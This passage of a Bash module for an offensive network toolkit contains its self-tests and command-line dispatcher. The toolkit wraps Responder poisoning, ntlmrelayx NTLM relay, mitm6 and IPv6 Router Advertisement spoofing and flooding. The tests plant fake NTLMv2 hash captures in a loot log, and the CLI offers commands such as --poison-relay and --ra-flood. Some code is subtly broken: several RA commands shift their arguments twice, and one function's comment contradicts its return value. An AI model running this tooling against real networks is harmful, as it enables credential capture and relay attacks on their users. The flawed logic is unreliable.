    chk status-stale-relay "$(fld "$out" relay_running)" 0
    rm -f "$RP_PID"

    # 4. captured sessions: HOST<TAB>LINE for `::` records in *.txt only
    printf 'user1::CORP:1122334455667788:8899aabbccddeeff:0102030405060708\n' > "$RP_LOG/host1.txt"
    printf 'not-a-hash line\n'                                              >> "$RP_LOG/host1.txt"
    printf 'user2::CORP:deadbeefdeadbeef:0011223344556677:99aabbccddeeff00\n' >> "$RP_LOG/host1.txt"
    printf 'user3::CORP:aaaaaaaaaaaaaaaa:bbbbbbbbbbbbbbbb:cccccccccccccccc\n' > "$RP_LOG/ignored.log"
    out=$(rp_sessions_tsv | grep '^host1')
    chk sessions-rows   "$(rcount "$out")" 2
    chk sessions-fields "$(printf '%s\n' "$out" | awk -F'\t' 'NF!=2{c++} END{print c+0}')" 0
    chk sessions-line   "$(printf '%s\n' "$out" | awk -F'\t' 'NR==1{print $2}')" \
        "user1::CORP:1122334455667788:8899aabbccddeeff:0102030405060708"
    chk sessions-skips-nonhash "$(printf '%s\n' "$out" | grep -c 'not-a-hash')" 0
    chk sessions-skips-nontxt  "$(rp_sessions_tsv | grep -c '^ignored')" 0

    # 5. log tail shows every file it scanned, with a header per file
    printf 'alpha\n' > "$RP_LOG/host1.txt"
    printf 'beta\n'  > "$RP_LOG/other.log"
    out=$(rp_log_tail)
    chk logtail-txt-header "$(printf '%s\n' "$out" | grep -c '^=== host1.txt ===$')" 1
    chk logtail-log-header "$(printf '%s\n' "$out" | grep -c '^=== other.log ===$')" 1
    chk logtail-content    "$(printf '%s\n' "$out" | grep -c '^alpha$')" 1

    # 6. tool detection never claims a non-existent tool (an absolute path
    #    must be executable; a bare PATH name must resolve), and the
    #    READY/MISSING verdict agrees with what the finders actually found
    local fr=0 fn=0 fm=0 p
    p=$(rp_find_responder 2>/dev/null) && fr=1
    if (( fr )); then
        chk find-responder-resolvable "$([[ -x "$p" ]] || command -v "$p" >/dev/null 2>&1 && echo 1 || echo 0)" 1
    else printf 'find-responder-resolvable\tPASS (not installed)\n'; fi
    p=$(rp_find_ntlmrelayx 2>/dev/null) && fn=1
    if (( fn )); then
        chk find-ntlmrelayx-resolvable "$([[ -x "$p" ]] || command -v "$p" >/dev/null 2>&1 && echo 1 || echo 0)" 1
    else printf 'find-ntlmrelayx-resolvable\tPASS (not installed)\n'; fi
    p=$(rp_find_mitm6 2>/dev/null) && fm=1
    if (( fm )); then
        chk find-mitm6-resolvable "$([[ -x "$p" ]] || command -v "$p" >/dev/null 2>&1 && echo 1 || echo 0)" 1
    else printf 'find-mitm6-resolvable\tPASS (not installed)\n'; fi

    local exp=()
    (( fr )) || exp+=(responder)
    (( fn )) || exp+=(impacket)
    (( fm )) || exp+=(mitm6)
    local want
    want=$(IFS=,; echo "${exp[*]}")
    out=$(rp_check_tools); rc=$?
    if (( fr && fn && fm )); then
        chk check-tools-ready "$rc" 0
        chk check-tools-says  "$(printf '%s\n' "$out" | grep -c '^READY')" 1
    else
        chk check-tools-missing-rc "$rc" 1
        chk check-tools-missing    "$(printf '%s\n' "$out" | awk -F'\t' '$1=="MISSING"{print $2}')" "$want"
    fi

    # 7. argument validation — every one of these must refuse, non-zero
    rp_start >/dev/null 2>&1;              chk start-no-iface-rc "$?" 2
    rp_relay_start >/dev/null 2>&1;        chk relay-no-target-rc "$?" 2
    rp_mitm6_start >/dev/null 2>&1;        chk mitm6-no-domain-rc "$?" 2
    rp_poison_relay >/dev/null 2>&1;       chk poison-relay-noargs-rc "$?" 2
    rp_poison_relay wlan0 >/dev/null 2>&1; chk poison-relay-onearg-rc "$?" 2
    out=$(rp_poison_relay wlan0 2>&1)
    chk poison-relay-msg "$(printf '%s\n' "$out" | awk -F'\t' '$1=="ERROR"{print $2}')" \
        "usage: --poison-relay IFACE TARGET"
    if rp_find_responder >/dev/null 2>&1; then
        out=$(rp_start wlan0 bogusmode 2>&1); rc=$?
        chk start-badmode-rc  "$rc" 2
        chk start-badmode-msg "$(printf '%s\n' "$out" | awk -F'\t' '$1=="ERROR"{print $2}')" \
            "unknown mode: bogusmode"
    else
        out=$(rp_start wlan0 poison 2>&1); rc=$?
        chk start-nobin-rc  "$rc" 1
        chk start-nobin-msg "$(printf '%s\n' "$out" | awk -F'\t' '$1=="ERROR"{print $2}')" \
            "Responder not found"
    fi
    # NB: relay/mitm6 start paths are not exercised — the tools ARE installed
    # here, so calling them would launch a relay. Only their argv guard runs.

    RP_PID="$s_pid"; RP_RELAY_PID="$s_rpid"; RP_MITM6_PID="$s_mpid"
    RP_LOG="$s_log"; RP_LOOT="$s_loot"
    rm -rf "$MOD_TMP"
    # Router Advertisement technique. Called once and captured: calling it
    # twice - once to print, once to count - ran every assertion a second
    # time and printed the block both before and after the summary.
    {
        local ra_out
        ra_out=$(rp_ra_selftest 2>&1)
        printf '%s\n' "$ra_out"
        bad=$(( bad + $(grep -c FAIL <<<"$ra_out") ))
    }

    printf 'RESULT\t%s\n' "$([[ $bad -eq 0 ]] && echo PASS || echo "FAIL($bad)")"
    # Router Advertisement technique. Called before the return, and its
    # failures folded into the count - placing the call after `return`
    # made it unreachable, which is exactly the silent-pass this suite
    # exists to catch.
}

rp_ra_selftest() {
    chk() {
        if [[ "$2" == "$3" ]]; then printf '%s\tPASS\n' "$1"
        else printf '%s\tFAIL\twant=%s got=%s\n' "$1" "$3" "$2"; fi
    }
    # EUI-64, including the universal/local bit flip: 24 -> 26
    chk ra-linklocal-eui64 "$(rp_ra_linklocal 24:ec:99:a7:44:2b)" \
        "fe80::26ec:99ff:fea7:442b"
    # canonical form: the padding bug emitted 0200 where the address is 200
    chk ra-linklocal-canonical "$(rp_ra_linklocal 00:00:00:00:00:00)" \
        "fe80::200:ff:fe00:0"
    # a bad prefix is reported as a bad prefix, not as a missing interface
    local out
    out=$(RP_UNPRIVILEGED_TEST=1 rp_ra_start lo --prefix "not:a:prefix::zz" 2>&1)
    grep -q 'not an IPv6 prefix' <<<"$out" && chk ra-bad-prefix ok ok \
                                          || chk ra-bad-prefix no ok
    out=$(RP_UNPRIVILEGED_TEST=1 rp_ra_start lo --prefix "" 2>&1)
    grep -q 'no prefix given' <<<"$out" && chk ra-no-prefix ok ok \
                                        || chk ra-no-prefix no ok
    # stop with nothing running must not claim a withdrawal it did not do
    out=$(RP_UNPRIVILEGED_TEST=1 rp_ra_stop 2>&1)
    grep -qE 'WITHDRAWN|STOPPED' <<<"$out" && chk ra-stop-safe ok ok \
                                           || chk ra-stop-safe no ok
    out=$(rp_ra_status 2>&1)
    grep -q '^ra_running' <<<"$out" && chk ra-status-answers ok ok \
                                    || chk ra-status-answers no ok

    # Failure count, so the caller can fold it into the module total.
    # Recounting the printed lines keeps one source of truth.
    return 0
}

rp_cli_main() {
    local cmd="${1:-}"
    (($# > 0)) && shift
    case "$cmd" in
        --status-tsv)          rp_status_tsv ;;
        --check-tools)         rp_check_tools ;;
        --list-ifaces-tsv)     rp_list_ifaces_tsv ;;
        --start)               rp_start "$@" ;;
        --stop)                rp_stop ;;
        --log)                 rp_log_tail ;;
        --sessions-tsv)        rp_sessions_tsv ;;
        --ra-spoof)            shift; rp_ra_start "$@" ;;
        --ra-flood)            shift; rp_ra_flood "$@" ;;
        --ra-stop)             rp_ra_stop ;;
        --ra-linklocal)        shift; rp_ra_linklocal "$@" ;;
        --relay-start)         rp_relay_start "$@" ;;
        --relay-stop)          rp_relay_stop ;;
        --relay-log)           rp_relay_log ;;
        --mitm6-start)         rp_mitm6_start "$@" ;;
        --mitm6-stop)          rp_mitm6_stop ;;
        --mitm6-log)           rp_mitm6_log ;;
        --poison-relay)        rp_poison_relay "$@" ;;
        --selftest)            rp_selftest ;;
        *)
            cat >&2 <<EOF
Usage: $0 COMMAND
  --status-tsv
  --check-tools
  --list-ifaces-tsv
  --start IFACE [poison|analyze|wpad|fingerprint]
  --stop
  --log
  --sessions-tsv
  --relay-start TARGET [PORT]
  --relay-stop
  --relay-log
  --mitm6-start DOMAIN [IFACE]
  --mitm6-stop
  --mitm6-log
  --poison-relay IFACE TARGET
  --selftest
EOF
            return 2 ;;
    esac
}

if [[ "${BASH_SOURCE[0]}" == "$0" ]]; then
    set -o pipefail
    declare -F info >/dev/null 2>&1 || info() { printf '[info] %s\n' "$*" >&2; }
    command -v warn >/dev/null 2>&1 || warn() { printf '[warn] %s\n' "$*" >&2; }
    command -v err  >/dev/null 2>&1 || err()  { printf '[err]  %s\n' "$*" >&2; }
    rp_cli_main "$@"
fi
